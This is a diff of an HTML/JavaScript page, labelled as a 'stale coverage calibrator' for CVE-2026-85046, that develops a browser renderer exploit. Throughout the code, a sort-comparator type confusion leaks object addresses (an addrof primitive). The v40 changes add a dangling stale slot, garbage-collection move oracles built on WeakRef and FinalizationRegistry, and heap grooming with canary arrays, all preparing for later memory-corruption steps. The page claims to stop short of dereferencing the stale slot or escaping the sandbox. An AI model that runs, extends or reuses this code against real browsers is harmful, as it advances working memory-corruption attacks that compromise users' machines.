@@ -3,43 +3,44 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>CVE-2026-85046 passive layout calibrator v39-A</title>
+  <title>CVE-2026-85046 same-run stale coverage calibrator v40</title>
   <style>
     :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
     body { margin: 0; padding: 24px; background: #09110e; color: #d9ffe7; }
-    main { max-width: 1040px; margin: auto; }
+    main { max-width: 1080px; margin: auto; }
     h1 { font-size: 20px; }
     p { color: #a9c9b4; line-height: 1.5; }
     button { padding: 10px 14px; background: #9cff57; color: #071007; border: 0; font-weight: 700; }
     button:disabled { background: #517349; color: #bed1b9; }
-    pre { white-space: pre-wrap; overflow-wrap: anywhere; border: 1px solid #335b43; padding: 16px; min-height: 360px; }
+    pre { white-space: pre-wrap; overflow-wrap: anywhere; border: 1px solid #335b43; padding: 16px; min-height: 380px; }
   </style>
 </head>
 <body>
 <main>
-  <h1>CVE-2026-85046 — passive layout calibrator v39-A</h1>
+  <h1>CVE-2026-85046 — same-run stale coverage calibrator v40</h1>
   <p>
-    This page allocates and retains one benign filler-shaped double array and
-    one maximum regular payload-shaped double array. Their backing stores use
-    distinct finite 64-bit canaries for offline dump identification. The page
-    ages the retained arrays with bounded task-separated pressure, then accepts
-    their wrapper addresses only when two pressure-free task observations are
-    identical. It creates no stale edge, dereferences no stale pointer, installs
-    no fake header, and performs no memory write, native-code, sandbox-escape,
-    file, or network operation.
+    This bounded diagnostic creates the already established missing-barrier
+    stale slot, waits for the target move and two post-move weak controls to
+    finalize, then allocates and retains one benign filler canary array and one
+    benign maximum-size payload canary array in the same run. It publishes the
+    stale slot only as a number and leaves the page idle for a full renderer
+    dump. It never dereferences the stale slot as an object and performs no fake
+    header, arbitrary-memory, native-code, sandbox-escape, file, or network
+    operation.
   </p>
-  <button id="arm">Arm and hold layout once</button>
-  <pre id="output">Ready. Click once, then acquire a full dump of the Embed renderer after READY FOR DUMP appears.</pre>
+  <button id="arm">Arm same-run layout once</button>
+  <pre id="output">Ready. Click once, wait for READY FOR FULL DUMP, then leave this Embed idle while acquiring the renderer dump.</pre>
 </main>
 <script>
 "use strict";
 
 var CONFIG = Object.freeze({
   warmupIterations: 8000,
-  ageChunks: 32,
-  allocationsPerAgeChunk: 64,
-  ageAllocationLength: 0x400,
-  approximateKiBPerAgeChunk: 512,
+  preAgeChunks: 32,
+  maxOracleChunks: 192,
+  allocationsPerChunk: 64,
+  allocationLength: 0x400,
+  approximateKiBPerChunk: 512,
   fillerLength: 0x3c60,
   payloadLength: 0x3fff,
   fillerFixedDoubleArrayBytes: 8 + (0x3c60 * 8),
@@ -56,16 +57,48 @@ var CONFIG = Object.freeze({
   }),
 });
 
-var state = {
-  armed: false,
-  runId: 0,
-  pressureSink: 0,
-  anchor: null,
-  prePressureLeak: null,
-  finalLeakA: null,
-};
+var ONE_SHOT_KEY = "f022-v40-same-run-coverage-started";
 var bitsBuffer = new ArrayBuffer(8);
 var bitsView = new DataView(bitsBuffer);
+var state = {
+  running: false,
+  runId: 0,
+  bad: null,
+  targetWeak: null,
+  beforeAddress: 0,
+  chunkIndex: 0,
+  moveChunk: null,
+  moveAddress: 0,
+  targetClearedChunk: null,
+  controlAWeak: null,
+  controlBWeak: null,
+  controlACreatedChunk: null,
+  controlBCreatedChunk: null,
+  controlAFinalizedChunk: null,
+  controlBFinalizedChunk: null,
+  finalizationEvents: [],
+  staleSamples: [],
+  anchor: null,
+  pressureSink: 0,
+};
+
+var registry = typeof FinalizationRegistry === "function"
+  ? new FinalizationRegistry(function (holding) {
+      var event = {
+        role: holding.role,
+        runId: holding.runId,
+        createdChunk: holding.createdChunk,
+        observedFinalizedChunk: state.chunkIndex,
+      };
+      state.finalizationEvents.push(event);
+      if (holding.role === "post-move-control-a" && state.controlAFinalizedChunk === null) {
+        state.controlAFinalizedChunk = state.chunkIndex;
+      }
+      if (holding.role === "post-move-control-b" && state.controlBFinalizedChunk === null) {
+        state.controlBFinalizedChunk = state.chunkIndex;
+      }
+    })
+  : null;
 
 function log(message) {
   var out = document.getElementById("output");
@@ -100,6 +133,15 @@ function wordsRecord(words) {
   };
 }
 
+function canaryRecord(scheme) {
+  return {
+    head: wordsRecord(scheme.head),
+    body: wordsRecord(scheme.body),
+    tail: wordsRecord(scheme.tail),
+    layout: "head,head,body...(repeated),tail,tail",
+  };
+}
+
 function confuse(array) {
   function compare() { array.fill(0); return 0; }
   array.sort(compare);
@@ -110,6 +152,42 @@ function warmup(iterations) {
     confuse([6, 9, 4, 2, 0]);
     confuse([{}, {}, {}]);
   }
+}
+
+function looksLikeLeak(parts) {
+  return parts.length >= 2 && parts.every(function (part) {
+    var n = Number(part);
+    return Number.isInteger(n) && n > 100000 && n < 4294967296;
+  });
+}
+
+function addrofLeak(target) {
+  var array = [target, target];
+  confuse(array);
+  var leaked = Number(String(array).split(",")[0]);
+  return Number.isInteger(leaked) ? (leaked * 2) >>> 0 : 0;
+}
+
+function allocationChunk() {
+  var sink = 0;
+  for (var i = 0; i < CONFIG.allocationsPerChunk; i++) {
+    var temporary = new Array(CONFIG.allocationLength).fill(1.1);
+    sink += temporary.length + temporary[0];
+  }
+  state.pressureSink += sink;
+}
+
+function readNumericStaleSlot() {
+  var text = null;
+  var address = 0;
+  var numeric = false;
+  try {
+    text = String(state.bad);
+    var raw = Number(text.split(",")[2]);
+    numeric = Number.isInteger(raw);
+    if (numeric) address = (raw * 2) >>> 0;
+  } catch (_) {}
+  return { numeric: numeric, address: address, text: text };
 }
 
 function allocateCanaryArray(length, scheme) {
@@ -127,145 +205,282 @@ function allocateCanaryArray(length, scheme) {
   return array;
 }
 
-// Keep these as distinct exact allocation sites for dump correlation.
-function allocateFiller() {
+// These are the exact two allocation sites whose backing ranges will be
+// located and measured offline. No placement claim is made in-page.
+function allocateFillerAtIntendedSite() {
   return allocateCanaryArray(CONFIG.fillerLength, CONFIG.fillerCanary);
 }
 
-function allocatePayload() {
+function allocatePayloadAtIntendedSite() {
   return allocateCanaryArray(CONFIG.payloadLength, CONFIG.payloadCanary);
 }
 
-function simultaneousWrapperLeak(filler, payload) {
-  // One sacrificial array, one confusion call and one String conversion. The
-  // live filler/payload references are separately retained before this call.
-  var sacrificial = [filler, payload];
-  confuse(sacrificial);
-  var text = String(sacrificial);
-  var parts = text.split(",");
-  var rawFiller = Number(parts[0]);
-  var rawPayload = Number(parts[1]);
-  var observed = parts.length === 2 &&
-    Number.isInteger(rawFiller) && Number.isInteger(rawPayload) &&
-    rawFiller > 100000 && rawPayload > 100000;
-  return {
-    sacrificial: sacrificial,
-    text: text,
-    observed: observed,
-    fillerAddress: observed ? (rawFiller * 2) >>> 0 : 0,
-    payloadAddress: observed ? (rawPayload * 2) >>> 0 : 0,
+function makeControl(role) {
+  var control = { role: role, runId: state.runId, createdChunk: state.chunkIndex };
+  var weak = new WeakRef(control);
+  registry.register(control, {
+    role: role,
+    runId: state.runId,
+    createdChunk: state.chunkIndex,
+  });
+  return weak;
+}
+
+function installStaleTarget() {
+  var target = { x: 420, runId: state.runId };
+  state.targetWeak = new WeakRef(target);
+  state.bad[1] = target;
+  confuse(state.bad);
+  var parts = String(state.bad).split(",");
+  if (!looksLikeLeak(parts)) return { ok: false, observed: String(state.bad) };
+  state.beforeAddress = (Number(parts[1]) * 2) >>> 0;
+  state.bad.unshift(0);
+  return { ok: true };
+}
+
+function fail(outcome, detail) {
+  var stale = state.bad ? readNumericStaleSlot() : { numeric: false, address: 0, text: null };
+  var result = {
+    outcome: outcome,
+    banner: "NOT DUMP READY",
+    runId: state.runId,
+    detail: detail || null,
+    beforeAddress: state.beforeAddress ? hex32(state.beforeAddress) : null,
+    staleSlotAfter: stale.numeric ? hex32(stale.address) : null,
+    staleSlotNumeric: stale.numeric,
+    staleSlotStillOriginal: stale.numeric && stale.address === state.beforeAddress,
+    staleSlotDereferenceAttempted: false,
+    fakeHeaderAttempted: false,
+    arbitraryMemoryAccessAttempted: false,
+    nativeCodeExecutionAttempted: false,
+    sandboxEscapeAttempted: false,
+    externalNetworkUsed: false,
   };
+  window.probeResult = result;
+  log("[!] NOT DUMP READY: " + outcome);
+  log("\n" + JSON.stringify(result, null, 2));
 }
 
-function canaryRecord(scheme) {
-  return {
-    head: wordsRecord(scheme.head),
-    body: wordsRecord(scheme.body),
-    tail: wordsRecord(scheme.tail),
-    layout: "head,head,body...(repeated),tail,tail",
-  };
-}
-
-function leakRecord(leak) {
-  return {
-    observed: leak.observed,
-    rawText: leak.text,
-    fillerCompressedUntagged: leak.observed ? hex32(leak.fillerAddress) : null,
-    fillerCompressedTagged: leak.observed
-      ? hex32((leak.fillerAddress | 1) >>> 0) : null,
-    payloadCompressedUntagged: leak.observed ? hex32(leak.payloadAddress) : null,
-    payloadCompressedTagged: leak.observed
-      ? hex32((leak.payloadAddress | 1) >>> 0) : null,
-    wrapperDelta: leak.observed
-      ? (leak.payloadAddress - leak.fillerAddress) | 0 : null,
-  };
-}
-
-function leaksMatch(left, right) {
-  return left.observed && right.observed &&
-    left.fillerAddress === right.fillerAddress &&
-    left.payloadAddress === right.payloadAddress;
-}
-
-function allocationPressureChunk() {
-  var sink = 0;
-  for (var i = 0; i < CONFIG.allocationsPerAgeChunk; i++) {
-    var temporary = new Array(CONFIG.ageAllocationLength).fill(1.1);
-    sink += temporary.length + temporary[0];
+function preAgeTask(index) {
+  allocationChunk();
+  if (index < CONFIG.preAgeChunks) {
+    setTimeout(function () { preAgeTask(index + 1); }, 0);
+    return;
   }
-  state.pressureSink += sink;
+  log("[+] Receiver/backing pre-age completed: " + CONFIG.preAgeChunks + " chunks.");
+  var setup = installStaleTarget();
+  if (!setup.ok) {
+    fail("v40-target-address-leak-not-observed", setup.observed);
+    return;
+  }
+  log("[+] Numeric stale edge armed at " + hex32(state.beforeAddress) + ".");
+  log("[*] Waiting for target move and two post-move control finalizations...");
+  setTimeout(oraclePressureTask, 0);
 }
 
-function publishFinal(finalLeakB) {
-  var stable = leaksMatch(state.finalLeakA, finalLeakB);
-  var preMatchesFinal = leaksMatch(state.prePressureLeak, finalLeakB);
-  state.anchor.sacrificials.push(finalLeakB.sacrificial);
-  state.anchor.leakTexts.push(finalLeakB.text);
+function oraclePressureTask() {
+  state.chunkIndex++;
+  allocationChunk();
+  setTimeout(oracleObservationTask, 0);
+}
+
+function oracleObservationTask() {
+  var observeTarget = state.moveChunk === null;
+  var target = null;
+  var currentAddress = 0;
+  if (observeTarget) {
+    target = state.targetWeak.deref();
+    currentAddress = target === undefined ? 0 : addrofLeak(target);
+  }
+  var stale = readNumericStaleSlot();
+
+  if (state.staleSamples.length < 16 || state.chunkIndex % 16 === 0) {
+    state.staleSamples.push({
+      chunk: state.chunkIndex,
+      targetAlive: observeTarget ? target !== undefined : null,
+      targetAddress: currentAddress ? hex32(currentAddress) : null,
+      staleAddress: stale.numeric ? hex32(stale.address) : null,
+      staleStillOriginal: stale.numeric && stale.address === state.beforeAddress,
+    });
+  }
+
+  if (observeTarget && target === undefined && state.targetClearedChunk === null) {
+    state.targetClearedChunk = state.chunkIndex;
+  }
+
+  if (observeTarget && target !== undefined && currentAddress &&
+      currentAddress !== state.beforeAddress && state.moveChunk === null) {
+    state.moveChunk = state.chunkIndex;
+    state.moveAddress = currentAddress;
+    state.controlACreatedChunk = state.chunkIndex;
+    state.controlAWeak = makeControl("post-move-control-a");
+    log("[+] Target moved at chunk " + state.moveChunk + ": " +
+      hex32(state.beforeAddress) + " -> " + hex32(currentAddress));
+    setTimeout(createSecondControlTask, 0);
+    return;
+  }
+
+  if (state.moveChunk !== null && state.controlAFinalizedChunk !== null &&
+      state.controlBFinalizedChunk !== null) {
+    // No pressure task is queued from this observation-only job.
+    allocateSameRunCanaries();
+    return;
+  }
+
+  if (state.chunkIndex >= CONFIG.maxOracleChunks) {
+    fail(state.moveChunk === null
+      ? "v40-target-did-not-move-within-bound"
+      : "v40-controls-did-not-finalize-within-bound");
+    return;
+  }
+  setTimeout(oraclePressureTask, 0);
+}
+
+function createSecondControlTask() {
+  state.chunkIndex++;
+  allocationChunk();
+  state.controlBCreatedChunk = state.chunkIndex;
+  state.controlBWeak = makeControl("post-move-control-b");
+  log("[*] Two post-move controls installed in consecutive tasks.");
+  setTimeout(oracleObservationTask, 0);
+}
+
+function allocateSameRunCanaries() {
+  var staleBefore = readNumericStaleSlot();
+  if (!staleBefore.numeric || staleBefore.address !== state.beforeAddress) {
+    fail("v40-stale-slot-changed-before-canary-allocation");
+    return;
+  }
+
+  log("[+] Both controls finalized by chunk " + state.chunkIndex + ".");
+  log("[*] Allocating the benign filler and payload canaries at the intended sites...");
+  state.anchor = {
+    runId: state.runId,
+    badNumericOnly: state.bad,
+    filler: null,
+    payload: null,
+    weakRefs: {
+      target: state.targetWeak,
+      controlA: state.controlAWeak,
+      controlB: state.controlBWeak,
+    },
+  };
+  window.v40SameRunAnchor = state.anchor;
+  // Retain each role immediately after its single exact allocation. There is
+  // no log, timer, address leak or pressure between allocation and retention.
+  state.anchor.filler = allocateFillerAtIntendedSite();
+  state.anchor.payload = allocatePayloadAtIntendedSite();
+
+  var staleAfter = readNumericStaleSlot();
+  if (!staleAfter.numeric || staleAfter.address !== state.beforeAddress) {
+    fail("v40-stale-slot-changed-after-canary-allocation");
+    return;
+  }
+  publishReady(staleBefore, staleAfter);
+}
+
+function publishReady(staleBefore, staleAfter) {
+  var fillerFirst = doubleToWords(state.anchor.filler[0]);
+  var fillerLast = doubleToWords(state.anchor.filler[state.anchor.filler.length - 1]);
+  var payloadFirst = doubleToWords(state.anchor.payload[0]);
+  var payloadLast = doubleToWords(state.anchor.payload[state.anchor.payload.length - 1]);
+  var canariesIntact = state.anchor.filler.length === CONFIG.fillerLength &&
+    state.anchor.payload.length === CONFIG.payloadLength &&
+    fillerFirst[0] === CONFIG.fillerCanary.head[0] &&
+    fillerFirst[1] === CONFIG.fillerCanary.head[1] &&
+    fillerLast[0] === CONFIG.fillerCanary.tail[0] &&
+    fillerLast[1] === CONFIG.fillerCanary.tail[1] &&
+    payloadFirst[0] === CONFIG.payloadCanary.head[0] &&
+    payloadFirst[1] === CONFIG.payloadCanary.head[1] &&
+    payloadLast[0] === CONFIG.payloadCanary.tail[0] &&
+    payloadLast[1] === CONFIG.payloadCanary.tail[1];
+  var ready = staleBefore.numeric && staleAfter.numeric &&
+    staleBefore.address === state.beforeAddress &&
+    staleAfter.address === state.beforeAddress && canariesIntact &&
+    state.moveChunk !== null && state.controlAFinalizedChunk !== null &&
+    state.controlBFinalizedChunk !== null;
 
   var result = {
-    outcome: stable
-      ? "v39-layout-ready-for-full-dump"
-      : "v39-layout-held-wrapper-addresses-unstable",
-    banner: stable ? "READY FOR DUMP" : "NOT DUMP READY",
+    outcome: ready
+      ? "v40-same-run-coverage-ready-for-full-dump"
+      : "v40-same-run-coverage-not-dump-ready",
+    banner: ready ? "READY FOR FULL DUMP" : "NOT DUMP READY",
     runId: state.runId,
-    typeConfusionObserved: state.prePressureLeak.observed &&
-      state.finalLeakA.observed && finalLeakB.observed,
-    addressStability: {
-      accepted: stable,
-      classification: "pre-publication-address-stability-only",
-      acceptanceRule:
-        "two simultaneous pair leaks in separate post-pressure tasks must match exactly",
-      prePressure: leakRecord(state.prePressureLeak),
-      finalObservationA: leakRecord(state.finalLeakA),
-      finalObservationB: leakRecord(finalLeakB),
-      stableAcrossPostPressureTasks: stable,
-      unchangedFromPrePressure: preMatchesFinal,
-      movedDuringAging: state.prePressureLeak.observed && finalLeakB.observed
-        ? !preMatchesFinal : null,
-      limitation:
-        "These are pre-publication hints, not asserted dump-time addresses: result/DOM/JSON publication can allocate after the last leak. Locate exact canary backings first in the full dump, then resolve actual wrappers by elements+length.",
+    typeConfusionObserved: true,
+    staleEvidence: {
+      beforeAddress: hex32(state.beforeAddress),
+      moveChunk: state.moveChunk,
+      moveAddress: state.moveAddress ? hex32(state.moveAddress) : null,
+      targetClearedChunk: state.targetClearedChunk,
+      staleSlotImmediatelyBeforePlacement: staleBefore.numeric ? hex32(staleBefore.address) : null,
+      staleSlotImmediatelyAfterPlacement: staleAfter.numeric ? hex32(staleAfter.address) : null,
+      staleSlotNumeric: staleBefore.numeric && staleAfter.numeric,
+      staleSlotStillOriginal: staleBefore.address === state.beforeAddress &&
+        staleAfter.address === state.beforeAddress,
+      numericStringBeforePlacement: staleBefore.text,
+      numericStringAfterPlacement: staleAfter.text,
+      samples: state.staleSamples,
     },
-    aging: {
-      taskSeparated: true,
-      chunksCompleted: CONFIG.ageChunks,
-      allocationsPerChunk: CONFIG.allocationsPerAgeChunk,
-      allocationLength: CONFIG.ageAllocationLength,
-      approximateKiBPerChunk: CONFIG.approximateKiBPerAgeChunk,
+    gcOracle: {
+      finalChunkBeforeCanaryAllocation: state.chunkIndex,
+      controlA: {
+        createdChunk: state.controlACreatedChunk,
+        finalizedChunk: state.controlAFinalizedChunk,
+      },
+      controlB: {
+        createdChunk: state.controlBCreatedChunk,
+        finalizedChunk: state.controlBFinalizedChunk,
+      },
+      finalizationEvents: state.finalizationEvents,
+      preAgeChunks: CONFIG.preAgeChunks,
+      canaryAgeChunks: 0,
+      allocationsPerChunk: CONFIG.allocationsPerChunk,
+      allocationLength: CONFIG.allocationLength,
+      approximateKiBPerChunk: CONFIG.approximateKiBPerChunk,
       pressureSink: state.pressureSink,
       pressureAfterFinalObservation: false,
+      queuedPressureAtPlacement: false,
     },
     retainedArrays: {
-      globalAnchor: "window.v39LayoutAnchor",
+      globalAnchor: "window.v40SameRunAnchor",
       fillerLength: state.anchor.filler.length,
       fillerLengthHex: "0x" + state.anchor.filler.length.toString(16),
       fillerFixedDoubleArrayBytes: CONFIG.fillerFixedDoubleArrayBytes,
       payloadLength: state.anchor.payload.length,
       payloadLengthHex: "0x" + state.anchor.payload.length.toString(16),
       payloadFixedDoubleArrayBytes: CONFIG.payloadFixedDoubleArrayBytes,
+      endpointCanariesIntact: canariesIntact,
     },
     canaries: {
       byteOrder: "little-endian 32-bit words [lo,hi]",
       filler: canaryRecord(CONFIG.fillerCanary),
       payload: canaryRecord(CONFIG.payloadCanary),
     },
-    evidenceScope: {
-      classification: "layout-only",
-      sameRunStaleCoverageMeasured: false,
-      finalWrapperAddressesAreDumpTimeExact: false,
-      offlineLookupOrder:
-        "exact canary backing -> actual wrapper elements+length -> record actual maps",
+    wrapperHints: {
+      collectedAfterPlacement: false,
+      reason:
+        "Post-placement confusion/address leaks and aging were omitted to keep allocator state quiescent; dump analysis is canary-first and authoritative.",
+      authoritativeForCoverage: false,
+    },
+    offlineAcceptance: {
+      sameRun: true,
+      coverageMeasuredInPage: false,
+      requiredOrder:
+        "locate exact canary backing ranges -> resolve actual wrappers/elements/length -> reconstruct full compressed stale address using dump cage base -> test stale address inside either exact backing data interval -> compute byte offset/residue/phase",
       statement:
-        "This run measures stable live wrapper/backing layout only; it does not establish that a stale address from another run lies inside either backing store.",
+        "Only full-dump canary-first analysis may establish coverage; wrapper deltas and page-offset models are not accepted as coverage evidence.",
     },
     holdState: {
       globalsRetained: true,
+      staleCarrierRetained: true,
       allocationTimersActive: false,
-      instruction: stable
+      instruction: ready
         ? "Acquire a full dump of this Embed renderer now; leave the page idle."
-        : "Do not use this run for a dump claim; wrapper addresses were not stable.",
+        : "Do not use this run for a coverage claim.",
     },
-    staleEdgeCreated: false,
+    staleEdgeCreated: true,
     staleSlotDereferenceAttempted: false,
+    staleSlotNumericStringLeakAttempted: true,
     fakeHeaderAttempted: false,
     arbitraryMemoryAccessAttempted: false,
     nativeCodeExecutionAttempted: false,
@@ -274,86 +489,72 @@ function publishFinal(finalLeakB) {
   };
 
   window.probeResult = result;
-  log((stable ? "[+] READY FOR DUMP" : "[!] NOT DUMP READY") +
+  log((ready ? "[+] READY FOR FULL DUMP" : "[!] NOT DUMP READY") +
     " — runId=" + state.runId);
-  log("[+] final filler wrapper=" +
-    (finalLeakB.observed ? hex32(finalLeakB.fillerAddress) : "not observed") +
-    " length=" + state.anchor.filler.length);
-  log("[+] final payload wrapper=" +
-    (finalLeakB.observed ? hex32(finalLeakB.payloadAddress) : "not observed") +
-    " length=" + state.anchor.payload.length);
-  log("[*] Post-pressure wrapper stability=" + stable +
-    "; arrays remain in window.v39LayoutAnchor; the page is now idle.");
+  log("[+] stale numeric address=" + hex32(state.beforeAddress));
+  log("[+] retained filler length=" + state.anchor.filler.length);
+  log("[+] retained payload length=" + state.anchor.payload.length);
+  log("[*] The page is idle; no timer or pressure allocation remains.");
   log("\n" + JSON.stringify(result, null, 2));
 }
 
-function finalObservationBTask() {
-  // No pressure precedes or follows this observation. Publishing is the final
-  // task; no timer is scheduled after this function returns.
-  var finalLeakB = simultaneousWrapperLeak(
-    state.anchor.filler, state.anchor.payload);
-  publishFinal(finalLeakB);
-}
-
-function finalObservationATask() {
-  // First pressure-free stability observation. Do not log or format the DOM
-  // before scheduling the second pressure-free observation.
-  state.finalLeakA = simultaneousWrapperLeak(
-    state.anchor.filler, state.anchor.payload);
-  state.anchor.sacrificials.push(state.finalLeakA.sacrificial);
-  state.anchor.leakTexts.push(state.finalLeakA.text);
-  setTimeout(finalObservationBTask, 0);
-}
-
-function ageTask(index) {
-  allocationPressureChunk();
-  if (index < CONFIG.ageChunks) {
-    setTimeout(function () { ageTask(index + 1); }, 0);
+function runOnce() {
+  if (state.running) return;
+  var prior = null;
+  try { prior = localStorage.getItem(ONE_SHOT_KEY); } catch (_) {}
+  if (prior) {
+    window.probeResult = {
+      outcome: "v40-one-test-per-fresh-renderer-gate",
+      previousAttempt: prior,
+      instruction: "Open a genuinely fresh renderer before running v40 again.",
+      staleSlotDereferenceAttempted: false,
+      nativeCodeExecutionAttempted: false,
+      sandboxEscapeAttempted: false,
+    };
+    document.getElementById("output").textContent = JSON.stringify(window.probeResult, null, 2);
     return;
   }
-  // The next task is the first post-pressure observation. No further pressure
-  // allocation occurs after this point.
-  setTimeout(finalObservationATask, 0);
-}
 
-function runOnce() {
-  if (state.armed) return;
-  state.armed = true;
+  state.running = true;
   state.runId = Date.now();
+  try {
+    localStorage.setItem(ONE_SHOT_KEY, JSON.stringify({
+      status: "started", runId: state.runId, startedAt: Date.now(),
+    }));
+  } catch (_) {}
+
   var button = document.getElementById("arm");
   button.disabled = true;
-  button.textContent = "Layout held for dump";
+  button.textContent = "Same-run state held for dump";
   document.getElementById("output").textContent = "";
+
+  if (typeof WeakRef !== "function" || !registry) {
+    fail("v40-weak-reference-apis-unavailable");
+    return;
+  }
 
   log("[*] Training the mixed-map sort path...");
   warmup(CONFIG.warmupIterations);
-  log("[*] Allocating filler and payload canary arrays once...");
-
-  var filler = allocateFiller();
-  var payload = allocatePayload();
-  var anchor = {
-    runId: state.runId,
-    filler: filler,
-    payload: payload,
-    sacrificials: [],
-    leakTexts: [],
-  };
-  window.v39LayoutAnchor = anchor;
-  state.anchor = anchor;
-
-  state.prePressureLeak = simultaneousWrapperLeak(filler, payload);
-  anchor.sacrificials.push(state.prePressureLeak.sacrificial);
-  anchor.leakTexts.push(state.prePressureLeak.text);
-  if (!state.prePressureLeak.observed) {
-    state.finalLeakA = state.prePressureLeak;
-    publishFinal(state.prePressureLeak);
+  var demo = [{ a: 1 }, { a: 2 }, { a: 3 }];
+  confuse(demo);
+  var parts = String(demo).split(",");
+  if (!looksLikeLeak(parts)) {
+    warmup(12000);
+    demo = [{ a: 1 }, { a: 2 }, { a: 3 }];
+    confuse(demo);
+    parts = String(demo).split(",");
+  }
+  if (!looksLikeLeak(parts)) {
+    fail("v40-type-confusion-not-observed");
     return;
   }
 
-  log("[+] Initial simultaneous wrapper leak observed.");
-  log("[*] Aging retained wrappers with " + CONFIG.ageChunks +
-    " task-separated bounded pressure chunks...");
-  setTimeout(function () { ageTask(1); }, 0);
+  log("[+] Type confusion observed.");
+  state.bad = [{ seed: 1 }, { seed: 2 }, 69];
+  state.bad.pop();
+  log("[*] Aging receiver/backing with " + CONFIG.preAgeChunks +
+    " task-separated bounded chunks...");
+  setTimeout(function () { preAgeTask(1); }, 0);
 }
 
 document.getElementById("arm").addEventListener("click", runOnce);
